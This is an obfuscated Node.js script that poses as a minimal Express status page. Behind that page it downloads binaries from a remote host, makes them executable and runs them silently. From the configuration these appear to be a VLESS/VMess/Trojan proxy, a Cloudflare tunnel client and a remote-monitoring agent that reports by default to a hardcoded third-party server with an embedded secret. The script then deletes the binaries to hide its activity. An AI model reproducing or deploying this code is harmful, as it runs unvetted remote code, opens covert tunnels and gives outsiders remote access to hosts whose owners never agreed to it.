const _0x131ee6=_0x3fd7;(function(_0x573281,_0x353c3e){const _0x34109d={_0xbf2086:0xb2,_0x473605:0xab,_0x6a7cb5:0x107,_0x55793e:0xed,_0x33551d:0xb0},_0x4d8bc8=_0x3fd7,_0x4ec637=_0x573281();while(!![]){try{const _0x28e9b8=parseInt(_0x4d8bc8(_0x34109d._0xbf2086))/0x1*(parseInt(_0x4d8bc8(0x113))/0x2)+parseInt(_0x4d8bc8(_0x34109d._0x473605))/0x3*(parseInt(_0x4d8bc8(_0x34109d._0x6a7cb5))/0x4)+-parseInt(_0x4d8bc8(0xc4))/0x5*(-parseInt(_0x4d8bc8(0xca))/0x6)+parseInt(_0x4d8bc8(_0x34109d._0x55793e))/0x7+-parseInt(_0x4d8bc8(_0x34109d._0x33551d))/0x8+-parseInt(_0x4d8bc8(0x100))/0x9+parseInt(_0x4d8bc8(0x9f))/0xa;if(_0x28e9b8===_0x353c3e)break;else _0x4ec637['push'](_0x4ec637['shift']());}catch(_0x2a3629){_0x4ec637['push'](_0x4ec637['shift']());}}}(_0x4212,0xdfddd));const express=require(_0x131ee6(0x109)),app=express(),axios=require(_0x131ee6(0xf6)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x131ee6(0xd8)),exec=promisify(require(_0x131ee6(0x11d))[_0x131ee6(0xb7)]),UPLOAD_URL=process[_0x131ee6(0xdc)][_0x131ee6(0xf1)]||'',PROJECT_URL=process[_0x131ee6(0xdc)][_0x131ee6(0xb6)]||'',AUTO_ACCESS=process[_0x131ee6(0xdc)][_0x131ee6(0x10d)]||![],FILE_PATH=process[_0x131ee6(0xdc)][_0x131ee6(0xbf)]||'.tmp',SUB_PATH=process[_0x131ee6(0xdc)]['SUB_PATH']||'sub',PORT=process[_0x131ee6(0xdc)][_0x131ee6(0x114)]||process[_0x131ee6(0xdc)][_0x131ee6(0xa6)]||0xbb8,UUID=process[_0x131ee6(0xdc)][_0x131ee6(0xc2)]||_0x131ee6(0x105),NEZHA_SERVER=process[_0x131ee6(0xdc)]['NEZHA_SERVER']||'agn.xinxi.pp.ua:443',NEZHA_PORT=process[_0x131ee6(0xdc)][_0x131ee6(0xc0)]||'',NEZHA_KEY=process['env'][_0x131ee6(0xa4)]||_0x131ee6(0xe5),ARGO_DOMAIN=process[_0x131ee6(0xdc)][_0x131ee6(0xb5)]||'',ARGO_AUTH=process[_0x131ee6(0xdc)][_0x131ee6(0xec)]||'',ARGO_PORT=process[_0x131ee6(0xdc)]['ARGO_PORT']||0x1f41,CFIP=process[_0x131ee6(0xdc)][_0x131ee6(0x9c)]||_0x131ee6(0xd7),CFPORT=process[_0x131ee6(0xdc)]['CFPORT']||0x1bb,NAME=process[_0x131ee6(0xdc)][_0x131ee6(0xf7)]||_0x131ee6(0xda);app[_0x131ee6(0xb1)]('/',async(_0x62472c,_0x162d7a)=>{const _0x568aba={_0x5b647c:0xcc,_0x6aae46:0xdb,_0x54fe75:0x112,_0x3fc7f6:0xfe,_0x9e69ca:0xc7,_0x19dcda:0xc9,_0x211777:0xd0},_0x13407e=_0x131ee6;try{const _0x1795f4=path[_0x13407e(_0x568aba._0x5b647c)](__dirname,_0x13407e(0x117));if(fs['existsSync'](_0x1795f4)){const _0x261d9b=await fs[_0x13407e(0x11a)][_0x13407e(_0x568aba._0x6aae46)](_0x1795f4,_0x13407e(_0x568aba._0x54fe75));_0x162d7a[_0x13407e(_0x568aba._0x3fc7f6)](_0x261d9b);}else _0x162d7a['send'](_0x13407e(_0x568aba._0x9e69ca)+SUB_PATH+_0x13407e(_0x568aba._0x19dcda));}catch(_0x18e876){_0x162d7a[_0x13407e(0xfe)](_0x13407e(_0x568aba._0x211777));}}),app['listen'](PORT,()=>console[_0x131ee6(0xad)]('HTTP\x20server\x20is\x20listening\x20on\x20port:\x20'+PORT));!fs['existsSync'](FILE_PATH)&&fs[_0x131ee6(0xd3)](FILE_PATH,{'recursive':!![]});function generateRandomName(){const _0x34a104={_0x14f884:0xfa},_0x4a33b1=_0x131ee6,_0x155535=_0x4a33b1(0xea);let _0x2ac369='';for(let _0x23fc35=0x0;_0x23fc35<0x6;_0x23fc35++){_0x2ac369+=_0x155535[_0x4a33b1(_0x34a104._0x14f884)](Math['floor'](Math[_0x4a33b1(0x10a)]()*_0x155535[_0x4a33b1(0xce)]));}return _0x2ac369;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x131ee6(0xcc)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x131ee6(0xcc)](FILE_PATH,webName),botPath=path[_0x131ee6(0xcc)](FILE_PATH,botName),subPath=path[_0x131ee6(0xcc)](FILE_PATH,_0x131ee6(0xbc)),listPath=path[_0x131ee6(0xcc)](FILE_PATH,'list.txt'),bootLogPath=path[_0x131ee6(0xcc)](FILE_PATH,_0x131ee6(0x104)),configPath=path[_0x131ee6(0xcc)](FILE_PATH,_0x131ee6(0xcb));async function generateConfig(){const _0x3fa3ba={_0x54f8fc:0xbd,_0x3b62c8:0xee,_0x332eea:0xfd,_0x557666:0xe4,_0x5346ea:0x10c,_0x4b6de7:0xbd,_0x49155e:0x10f,_0x58f300:0xc1,_0x2abb0f:0x10b,_0x51cea3:0xa8,_0x22a6e5:0xa9,_0xd4e9d0:0xc1,_0x3c2d4a:0xf8,_0x235f50:0xa9,_0x530c7b:0xeb,_0x366233:0x118,_0x2f0279:0xc5,_0x5b96ff:0x108},_0x2cf3c1=_0x131ee6,_0x54a2f3={'log':{'access':'/dev/null','error':_0x2cf3c1(0x103),'loglevel':_0x2cf3c1(_0x3fa3ba._0x54f8fc)},'inbounds':[{'port':parseInt(ARGO_PORT),'protocol':_0x2cf3c1(_0x3fa3ba._0x3b62c8),'settings':{'clients':[{'id':UUID,'flow':_0x2cf3c1(0xd6)}],'decryption':_0x2cf3c1(0xbd),'fallbacks':[{'dest':parseInt(PORT)},{'path':_0x2cf3c1(_0x3fa3ba._0x332eea),'dest':0xbba},{'path':_0x2cf3c1(_0x3fa3ba._0x557666),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x2cf3c1(_0x3fa3ba._0x5346ea)}},{'port':0xbb9,'listen':_0x2cf3c1(0x10b),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x2cf3c1(0xbd)},'streamSettings':{'network':_0x2cf3c1(0x10c),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x2cf3c1(_0x3fa3ba._0x3b62c8),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x2cf3c1(_0x3fa3ba._0x4b6de7),'wsSettings':{'path':_0x2cf3c1(0xfd)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x2cf3c1(_0x3fa3ba._0x49155e),_0x2cf3c1(_0x3fa3ba._0x58f300)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2cf3c1(_0x3fa3ba._0x2abb0f),'protocol':_0x2cf3c1(_0x3fa3ba._0x51cea3),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2cf3c1(_0x3fa3ba._0x557666)}},'sniffing':{'enabled':!![],'destOverride':[_0x2cf3c1(_0x3fa3ba._0x22a6e5),_0x2cf3c1(_0x3fa3ba._0x49155e),_0x2cf3c1(_0x3fa3ba._0xd4e9d0)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2cf3c1(_0x3fa3ba._0x2abb0f),'protocol':_0x2cf3c1(_0x3fa3ba._0x3c2d4a),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x2cf3c1(0xa1)}},'sniffing':{'enabled':!![],'destOverride':[_0x2cf3c1(_0x3fa3ba._0x235f50),_0x2cf3c1(0x10f),_0x2cf3c1(0xc1)],'metadataOnly':![]}}],'dns':{'servers':[_0x2cf3c1(_0x3fa3ba._0x530c7b)]},'outbounds':[{'protocol':'freedom','tag':_0x2cf3c1(_0x3fa3ba._0x366233)},{'protocol':_0x2cf3c1(_0x3fa3ba._0x2f0279),'tag':'block'}]};fs[_0x2cf3c1(0x110)](configPath,JSON[_0x2cf3c1(_0x3fa3ba._0x5b96ff)](_0x54a2f3,null,0x2));}function getSystemArchitecture(){const _0x559b03={_0x5ef31a:0xa0,_0x26e952:0xb8},_0x19b6fc=_0x131ee6,_0x3e5cc2=os[_0x19b6fc(_0x559b03._0x5ef31a)]();return _0x3e5cc2==='arm'||_0x3e5cc2==='arm64'||_0x3e5cc2==='aarch64'?_0x19b6fc(_0x559b03._0x26e952):_0x19b6fc(0xd2);}function downloadFile(_0x421ec0,_0x22da1b,_0x149d1d){const _0x21c0f1={_0x53d98f:0xff},_0x36e6c3={_0x392118:0x101},_0x6f3048=_0x131ee6,_0x19ac40=fs['createWriteStream'](_0x421ec0);axios({'method':_0x6f3048(0xb1),'url':_0x22da1b,'responseType':'stream'})[_0x6f3048(0xc3)](_0x36ea11=>{const _0x46b36f={_0x37696c:0x9b};_0x36ea11['data']['pipe'](_0x19ac40),_0x19ac40['on']('finish',()=>{const _0x34362d=_0x3fd7;_0x19ac40[_0x34362d(0x106)](),console['log'](_0x34362d(0xf3)+path[_0x34362d(_0x36e6c3._0x392118)](_0x421ec0)),_0x149d1d(null,_0x421ec0);}),_0x19ac40['on']('error',_0xbc235d=>{const _0xdc8ecb=_0x3fd7;fs[_0xdc8ecb(_0x46b36f._0x37696c)](_0x421ec0,()=>{}),_0x149d1d(_0xbc235d['message']);});})[_0x6f3048(_0x21c0f1._0x53d98f)](_0x2e978f=>_0x149d1d(_0x2e978f[_0x6f3048(0xe3)]));}async function downloadFilesAndRun(){const _0xe8b230={_0x3f7cb6:0xaa,_0x2d577c:0xcf,_0x310b3e:0x9e,_0x422d85:0xae,_0x2bce9f:0xb3,_0x229498:0xaf,_0x5bcbce:0xde,_0x5c340b:0x111,_0xc849b:0xe8,_0x3f6f71:0x9a,_0x54c0db:0xd5,_0x4fc87b:0xf0},_0x47241b={_0x497e86:0xba},_0x215788=_0x131ee6,_0x18293b=getSystemArchitecture(),_0x25be36=getFilesForArchitecture(_0x18293b);for(const _0x4a7f29 of _0x25be36){await new Promise((_0x3908b8,_0x428251)=>{const _0x53fa0c=_0x3fd7;downloadFile(_0x4a7f29[_0x53fa0c(_0x47241b._0x497e86)],_0x4a7f29[_0x53fa0c(0x9d)],_0x117bc0=>_0x117bc0?_0x428251(_0x117bc0):_0x3908b8());}),fs[_0x215788(_0xe8b230._0x3f7cb6)](_0x4a7f29[_0x215788(0xba)],0x1fd);}if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xafcbe2=[_0x215788(_0xe8b230._0x2d577c),_0x215788(_0xe8b230._0x310b3e),_0x215788(0xaf),_0x215788(0xde),'2083',_0x215788(0xf5)][_0x215788(0xdd)](_0xa95502=>NEZHA_SERVER[_0x215788(0x102)](':'+_0xa95502))?_0x215788(0xbe):_0x215788(_0xe8b230._0x422d85),_0x455777='client_secret:\x20'+NEZHA_KEY+_0x215788(0xb4)+NEZHA_SERVER+_0x215788(_0xe8b230._0x2bce9f)+_0xafcbe2+_0x215788(0xa5)+UUID+'\x0adebug:\x20false';fs[_0x215788(0x110)](path[_0x215788(0xcc)](FILE_PATH,_0x215788(0xe6)),_0x455777),exec('nohup\x20'+phpPath+_0x215788(0x10e)+FILE_PATH+_0x215788(0xe1));}else{const _0x8a3a15=['443','8443',_0x215788(_0xe8b230._0x229498),_0x215788(_0xe8b230._0x5bcbce),_0x215788(_0xe8b230._0x5c340b),_0x215788(0xf5)]['includes'](NEZHA_PORT)?_0x215788(_0xe8b230._0xc849b):'';exec(_0x215788(0xcd)+npmPath+_0x215788(_0xe8b230._0x3f6f71)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x8a3a15+'\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&');}}exec('nohup\x20'+webPath+_0x215788(_0xe8b230._0x54c0db)+configPath+'\x20>/dev/null\x202>&1\x20&');let _0x2f5431=ARGO_AUTH[_0x215788(0xe9)](/^[A-Z0-9a-z=]{120,250}$/)?_0x215788(_0xe8b230._0x4fc87b)+ARGO_AUTH:'tunnel\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+bootLogPath+_0x215788(0xac)+ARGO_PORT;exec(_0x215788(0xcd)+botPath+'\x20'+_0x2f5431+_0x215788(0xfb));}function _0x4212(){const _0x52087e=['toString','Galaxy','readFile','env','some','2087','&path=%2Fvless-argo%3Fed%3D2560#','unlinkSync','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','error','message','/vmess-argo','1FyZCXk9XGSarBQrCVE8WjyzXTfJFqH4','config.yaml','Content-Type','--tls','match','abcdefghijklmnopqrstuvwxyz','https+local://8.8.8.8/dns-query','ARGO_AUTH','1192142yKwIRX','vless','&fp=firefox&type=ws&host=','tunnel\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','UPLOAD_URL','Cleaned\x20up\x20binaries.','Downloaded\x20','from','2053','axios','NAME','trojan','/bot','charAt','\x20>/dev/null\x202>&1\x20&','?encryption=none&security=tls&sni=','/vless-argo','send','catch','12987135USvSHL','basename','includes','/dev/null','boot.log','4f96b9fd-5c6c-4e47-a328-ba8fcaff89de','close','3261896bSoFpm','stringify','express','random','127.0.0.1','tcp','AUTO_ACCESS','\x20-c\x20\x22','tls','writeFileSync','2083','utf8','72938xtIEav','SERVER_PORT','existsSync','https://amd64.ssss.nyc.mn','index.html','direct','/v1','promises','set','/vmess-argo?ed=2560','child_process','\x20-s\x20','unlink','CFIP','fileUrl','8443','16937460LxUQkW','arch','/trojan-argo','Sub\x20links\x20generated.','push','NEZHA_KEY','\x0auuid:\x20','PORT','base64','vmess','http','chmodSync','3GNkRTS','\x20--url\x20http://localhost:','log','false','2096','5133320rpqiLS','get','2vtjSRm','\x0atls:\x20','\x0aserver:\x20','ARGO_DOMAIN','PROJECT_URL','exec','arm','?security=tls&sni=','fileName','/agent','sub.txt','none','true','FILE_PATH','NEZHA_PORT','quic','UUID','then','1245865cZEmVg','blackhole','vless://','Service\x20is\x20running!<br><br>Visit\x20/','&path=%2Ftrojan-argo%3Fed%3D2560#','\x20to\x20get\x20nodes.','6QdsLSL','config.json','join','nohup\x20','length','443','Service\x20Status:\x20OK','firefox','amd','mkdirSync','/web','\x20-c\x20','xtls-rprx-vision','cdns.doon.eu.org','util'];_0x4212=function(){return _0x52087e;};return _0x4212();}function getFilesForArchitecture(_0x317ede){const _0x39b7f5={_0xf8c029:0xb8,_0x4d0e0b:0x116,_0x3b14b5:0xd4,_0x35012e:0x119},_0x3c3b4c=_0x131ee6,_0x4af433=_0x317ede===_0x3c3b4c(_0x39b7f5._0xf8c029)?'https://arm64.ssss.nyc.mn':_0x3c3b4c(_0x39b7f5._0x4d0e0b);let _0x5a7162=[{'fileName':webPath,'fileUrl':_0x4af433+_0x3c3b4c(_0x39b7f5._0x3b14b5)},{'fileName':botPath,'fileUrl':_0x4af433+_0x3c3b4c(0xf9)}];return NEZHA_SERVER&&NEZHA_KEY&&_0x5a7162[_0x3c3b4c(0xa3)]({'fileName':NEZHA_PORT?npmPath:phpPath,'fileUrl':NEZHA_PORT?_0x4af433+_0x3c3b4c(0xbb):_0x4af433+_0x3c3b4c(_0x39b7f5._0x35012e)}),_0x5a7162;}function _0x3fd7(_0x45ba9b,_0x1a7e0e){const _0x421237=_0x4212();return _0x3fd7=function(_0x3fd7a2,_0x5d7c79){_0x3fd7a2=_0x3fd7a2-0x9a;let _0x5bdd49=_0x421237[_0x3fd7a2];return _0x5bdd49;},_0x3fd7(_0x45ba9b,_0x1a7e0e);}async function extractDomains(){const _0x5524c2={_0xa3dfa:0x115};if(ARGO_AUTH&&ARGO_DOMAIN)await generateLinks(ARGO_DOMAIN);else{let _0x407a57=0x0;const _0x11d276=setInterval(async()=>{const _0x283205=_0x3fd7;_0x407a57++;if(fs[_0x283205(_0x5524c2._0xa3dfa)](bootLogPath)){const _0x3b9f87=fs['readFileSync'](bootLogPath,'utf-8'),_0x3b954e=_0x3b9f87['match'](/https?:\/\/([^ ]*trycloudflare\.com)/);_0x3b954e&&(clearInterval(_0x11d276),await generateLinks(_0x3b954e[0x1]));}if(_0x407a57>0x14)clearInterval(_0x11d276);},0xbb8);}}async function generateLinks(_0x192005){const _0x5a0fa2={_0x5d5e33:0x11c,_0x59c8a2:0xef,_0x30a9a0:0xf4,_0x477f44:0xd9,_0x4daad:0xb9,_0x17c179:0xef,_0x436b26:0xc8,_0x167029:0xf4,_0x5f0f65:0xa7,_0x36204b:0xa2},_0x3fc33e={_0x19d41e:0x11b,_0x117ad6:0xe7},_0x34da32=_0x131ee6,_0x46b74f=NAME,_0x2858f1={'v':'2','ps':_0x46b74f,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x34da32(0xbd),'net':'ws','type':_0x34da32(0xbd),'host':_0x192005,'path':_0x34da32(_0x5a0fa2._0x5d5e33),'tls':'tls','sni':_0x192005,'fp':_0x34da32(0xd1)},_0x51dd49=_0x34da32(0xc6)+UUID+'@'+CFIP+':'+CFPORT+_0x34da32(0xfc)+_0x192005+_0x34da32(_0x5a0fa2._0x59c8a2)+_0x192005+_0x34da32(0xdf)+_0x46b74f+'\x0a\x0avmess://'+Buffer[_0x34da32(_0x5a0fa2._0x30a9a0)](JSON[_0x34da32(0x108)](_0x2858f1))[_0x34da32(_0x5a0fa2._0x477f44)]('base64')+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x34da32(_0x5a0fa2._0x4daad)+_0x192005+_0x34da32(_0x5a0fa2._0x17c179)+_0x192005+_0x34da32(_0x5a0fa2._0x436b26)+_0x46b74f;fs[_0x34da32(0x110)](subPath,Buffer[_0x34da32(_0x5a0fa2._0x167029)](_0x51dd49)[_0x34da32(0xd9)](_0x34da32(_0x5a0fa2._0x5f0f65))),app['get']('/'+SUB_PATH,(_0x206451,_0x41672d)=>{const _0x1fc625=_0x34da32;_0x41672d[_0x1fc625(_0x3fc33e._0x19d41e)](_0x1fc625(_0x3fc33e._0x117ad6),'text/plain;\x20charset=utf-8'),_0x41672d['send'](Buffer['from'](_0x51dd49)[_0x1fc625(0xd9)]('base64'));}),console[_0x34da32(0xad)](_0x34da32(_0x5a0fa2._0x36204b));}async function start(){await generateConfig(),await downloadFilesAndRun(),await extractDomains();}start()['catch'](console[_0x131ee6(0xe2)]),setTimeout(()=>{const _0x452de0=_0x131ee6,_0x303e94=[webPath,botPath,npmPath,phpPath,bootLogPath,configPath];_0x303e94['forEach'](_0x4b2571=>fs[_0x452de0(0x115)](_0x4b2571)&&fs[_0x452de0(0xe0)](_0x4b2571)),console['log'](_0x452de0(0xf2));},0x15f90);
